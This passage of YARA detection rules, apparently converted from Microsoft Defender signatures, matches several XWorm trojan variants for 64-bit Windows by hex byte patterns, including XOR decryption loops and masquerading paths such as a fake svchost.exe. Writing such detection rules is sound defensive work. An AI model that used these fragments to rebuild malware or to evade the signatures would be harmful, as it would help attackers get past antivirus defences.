        $x_5_1 = {41 0f b6 c2 48 ff c5 c0 e0 ?? 44 0f b6 c8 41 8d 42 f8 c0 e0 ?? 41 fe c2 0f b6 c8 44 32 1c 11 45 88 1c 11 40 32 74 11 ?? 41 88 74 11 01 32 5c 11 ?? 41 88 5c 11 02 40 32 7c 11 ?? 41 88 7c 11 03 41 80 fa 3c}  //weight: 5, accuracy: Low
        $x_5_2 = {0f b6 44 24 29 42 30 04 31 8d 4d 08 0f b6 44 24 2a 42 30 04 31 8d 4d 09 0f b6 44 24 2b 42 30 04 31 8d 4d 0a 0f b6 44 24 2c 42 30 04 31 8d 4d 0b 0f b6 44 24 2d 42 30 04 31 8d 4d 0c 0f b6 44 24 2e 42 30 04 31 8d 4d 0d 0f b6 44 24 2f 83 c5 10 42 30 04 31 66 0f 7f 74 24 20 8d 45 fe 41 3b c7}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_ATR_2147970943_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.ATR!MTB"
        threat_id = "2147970943"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 89 c1 83 e1 0f 41 0f b6 0c 09 30 0c 02 48 83 c0 01 49 39 c0 75}  //weight: 5, accuracy: High
        $x_5_2 = {69 6e 64 6f 77 73 55 70 49 bb 64 61 74 65 5c 73 76 63 48 ba 61 6d 44 61 74 61 5c 57 48 b8 43 3a 5c 50 72 6f 67 72 4c 89 94 24 a0 00 00 00 48 8d 8c 24 30 01 00 00 49 ba 61 74 65 5c 73 76 63 68 4c 89 9c 24 a8 00 00 00 49 bb 6f 73 74 2e 65 78 65}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_ABKV_2147971461_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.ABKV!MTB"
        threat_id = "2147971461"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {66 44 0f db c1 66 45 0f ef c1 66 41 0f ef ec 66 0f ef ec 66 41 0f ef e8 66 45 0f ef d4 66 44 0f ef d4 66 45 0f ef d0 66 41 0f ef fc 66 0f ef fc 66 41 0f ef f8 66 41 0f ef dc 66 0f ef dc 66 41 0f ef d8}  //weight: 5, accuracy: High
        $x_5_2 = {41 0f b6 cc c1 e1 ?? 09 c1 41 0f b6 c6 c1 e0 ?? 09 c8 0f b6 cb c1 e1 ?? 09 c1 66 44 0f 6e c1}  //weight: 5, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_AMSI_2147971649_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.AMSI!MTB"
        threat_id = "2147971649"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {4a 8d 04 27 0f b6 0c 18 88 4c 24 ?? 41 83 7c 3f 04 ?? ?? ?? f6 d1 41 32 4c 3f ?? c0 c9 04 80 f1 ?? 88 4c 24 40 49 3b d0 ?? ?? 88 0a 48 8b 54 24 ?? 48 ff c2 48 89 54 24 ?? ?? ?? 4c 8d 44 24 ?? 48 8d 4c 24}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_XWorm_NW_2147971693_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/XWorm.NW!MTB"
        threat_id = "2147971693"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "XWorm"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {48 01 d0 44 0f b6 00 48 8b 85 a0 81 00 00 ba 00 00 00 00 48 f7 b5 80 81 00 00 48 8b 85 78 81 00 00 48 01 d0 0f b6 08 48 8b 95 88 81 00 00 48 8b 85 a0 81 00 00 48 01 d0 44 89 c2 31 ca 88 10 48 83 85 a0 81 00 00 01 8b 85 64 81 00 00 89 c0 48 39 85 a0 81 00 00}  //weight: 2, accuracy: High
        $x_2_2 = {48 89 c2 48 8d 85 60 80 00 00 48 01 d0 48 bf 5c 74 6d 70 2e 65 78 65 48 89 38 c6 40 08 00 48 8d 85 60 80 00 00 48 c7 44 24 30 00 00 00 00 c7 44 24 28 80 00 00 00 c7 44 24 20 02 00 00 00 41 b9 00 00 00 00 41 b8 00 00 00 00 ba 00 00 00 40 48 89 c1}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

